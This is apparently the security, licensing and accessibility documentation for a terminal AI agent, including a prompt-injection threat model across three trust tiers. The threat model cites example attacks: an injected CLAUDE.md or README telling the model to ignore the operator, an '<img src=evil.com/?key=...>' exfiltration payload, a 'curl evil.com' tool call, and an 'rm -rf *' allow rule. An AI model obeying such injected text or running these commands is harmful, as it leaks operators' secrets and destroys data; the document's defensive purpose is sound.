# Security, Licenses, and Accessibility

Quick reference for the third-party licenses pulled in by mink extras,
the prompt-injection threat model, and the accessibility posture of the
shipped TUI. Each section addresses an open audit finding (M-12, M-13,
M-14 from `research/mink/AUDIT.md`).

## Third-party license attribution (audit M-12)

The mink CLI extras pull in a small set of OSI-approved dependencies.
None are vendored; all are pip / uv extras you opt into:

| Extra      | Package      | Version | License            | Source                            |
|------------|--------------|---------|--------------------|-----------------------------------|
| `mink`     | `rich`       | >= 13.7 | MIT                | <https://github.com/Textualize/rich> |
| `mink`     | `pygments`   | >= 2.17 | BSD 2-clause       | <https://pygments.org>            |
| `notebook` | `nbformat`   | >= 5    | BSD 3-clause       | <https://github.com/jupyter/nbformat> |
| `mcp`      | `websockets` | >= 12   | BSD 3-clause       | <https://github.com/python-websockets/websockets> |

All four licenses permit redistribution as part of a derivative work
without royalty, with the standard requirement to retain the copyright
notice. The pyproject.toml `[project.optional-dependencies]` block is
the canonical record; this table is a convenience snapshot for license
review.

If you ship `chimera-run[all]` to end users, include the upstream
LICENSE files alongside your own LICENSE in your distribution. The
text of each license is recoverable from the installed package metadata
(`pip show -f rich | grep -i license`).

## Prompt-injection threat model (audit M-13)

The mink runtime accepts text input from three trust tiers. Every
mitigation in this section is enforced at runtime; gaps are flagged
explicitly.

### Tier 1 — operator input (highest trust)

Source: the user's keyboard, command-line args, `~/.chimera/settings.json`,
`~/.claude/settings.json`. Trust assumption: the operator owns the
machine and consents to anything they type.

Mitigations: none required at this tier.

### Tier 2 — project files (medium trust)

Source: `<cwd>/.claude/settings.json`, `<cwd>/.claude/settings.local.json`,
`<cwd>/.chimera/settings.json`, `<cwd>/.mcp.json`, `<cwd>/CLAUDE.md`,
`<cwd>/.claude/agents/*.md`. Trust assumption: the operator authored
these or reviewed them after `git clone`.

Risks:

- A `.claude/settings.json` from a cloned repo can declare `allow`
  rules that auto-approve risky commands the operator did not intend
  to whitelist (e.g. `Bash(command:rm -rf *)`).
- A `CLAUDE.md` file in a cloned repo will be loaded by the walk-up
  memory loader (`chimera/context/agent_memory.py`) and injected into
  the system prompt with no review.
- A project `.mcp.json` may declare a server whose `command` field
  invokes an arbitrary binary on the operator's machine.

Mitigations in place:

- `chimera/permissions/checker.py` denies `Bash(sudo*)`,
  `WebFetch`, `Read(file_path:**/.env)` by default unless an explicit
  allow rule overrides — and `bypassPermissions` mode does not
  short-circuit ASK rules from the security analyzer (a "bypass-immune"
  decision; see `docs/mink/permissions.md`).
- `chimera/secrets/redactor.py` walks every `output`, `arguments`,
  `tool_metadata`, and `metadata` payload (incl. nested dicts and
  lists) for known secret values registered via
  `SecretRegistry.register_from_env`. The 10 built-in
  `SecretDetector` patterns also match Bearer tokens, AWS keys, and
  PEM blocks even when the secret was not explicitly registered.

Gaps (un-fixed):

- The CLAUDE.md walk-up loader does **not** prompt before injecting a
  freshly-cloned project's memory. An attacker who controls a repo
  could inject prompt-injection text into the system prompt the moment
  the operator runs `chimera mink` from inside the repo. Mitigation:
  `cat CLAUDE.md` before running mink in an untrusted clone.
- `.mcp.json` server commands are executed without an integrity check
  beyond the operator-level permission system. Treat `.mcp.json` as
  executable code and review it before launching.

### Tier 3 — model output and tool results (lowest trust)

Source: provider responses, tool result strings (file contents, web
fetches, MCP server outputs). Trust assumption: untrusted by default.

Risks:

- A tool result containing prompt-injection text (e.g. a malicious
  README that instructs the model to ignore the operator's prompt)
  can subvert the agent loop.
- A web fetch result containing an exfiltration payload (e.g. an
  `<img src=evil.com/?key=...>` block) can leak data through the
  next assistant message.

Mitigations in place:

- The permission checker runs on every tool call, so even a prompt-
  injected model response that tries to call `Bash(curl evil.com ...)`
  will face the operator's deny / ask rules.
- `RedactionMiddleware` runs on `ToolResultEvent.output` containers
  (audit M-9 fix), so secrets that the model echoes back through a
  tool result are scrubbed before reaching the JSON serializer.

Gaps (un-fixed):

- Tool-result poisoning of the system prompt is not separately
  mitigated; the system prompt is only re-injected on compaction
  (file-aware compaction preserves the `<memory source="CLAUDE.md">`
  sentinel so the original guidance is not lost).

### Reporting a security issue

If you find a security issue in mink or the wider Chimera codebase,
file an issue on the GitHub repo with the label `security` (or email
the maintainer for embargoed reports). Do not file a PR with the
exploit until a fix lands.

## Accessibility (audit M-14)

The default rendered output uses ANSI color and the spinner from
`chimera/cli/render.py`. This is suitable for sighted users on a
terminal that supports 256-color or truecolor.

For screen readers, accessibility-impaired users, and CI / log
consumers, mink supports a plain-text mode through three independent
mechanisms:

1. **`NO_COLOR` environment variable.** Set to any value to suppress
   ANSI color globally:

   ```bash
   NO_COLOR=1 chimera mink -p "explain this repo"
   ```

2. **`CHIMERA_NO_COLOR` Chimera-specific override.** Same effect as
   `NO_COLOR` but scoped to mink/chimera-only invocations so other
   tools in your shell session are unaffected.

3. **`--no-rich` / piped stdout.** When stdout is detected to not be
   a TTY (`isatty()` returns `False`), the auto-detection in
   `chimera/streaming/handlers.py:should_use_color` falls back to
   plain text. `--no-rich` (when present on the active subcommand)
   forces the same path even on a TTY.

In plain-text mode the renderer:

- Strips every ANSI escape sequence (`chimera/streaming/handlers.py:strip_ansi`)
  before writing to the stream.
- Still emits the `[Tool: name]` / `[Result: ...]` framing lines —
  unless you also pass `--quiet`, which suppresses the framing chrome
  and prints only assistant text.

The result is a screen-reader-friendly transcript that reads as
sequential text without escape-sequence noise.

### Known accessibility limitations

- The interactive permission prompt (`chimera/cli/permission_prompt.py`)
  reads single keystrokes via `termios` + `tty.setcbreak` on POSIX.
  This works with most screen readers in cooperative mode, but the
  `[a]/[A]/[d]/[D]/[c]/[?]` legend is hard to navigate with a refreshable
  braille display. When stdin is not a TTY the prompt fails closed
  with a single `DENY` rather than hanging — set
  `--permission-mode acceptEdits` or pre-author allow rules in
  `.claude/settings.json` to skip the prompt entirely for batch use.
- The spinner in `chimera/cli/render.py` updates in place via
  `\r`. Some screen readers re-announce the line on every update; pass
  `--no-rich` or set `NO_COLOR` to silence the spinner.

If you need a feature that's missing, file an issue with the label
`accessibility` and a description of the assistive technology you use.
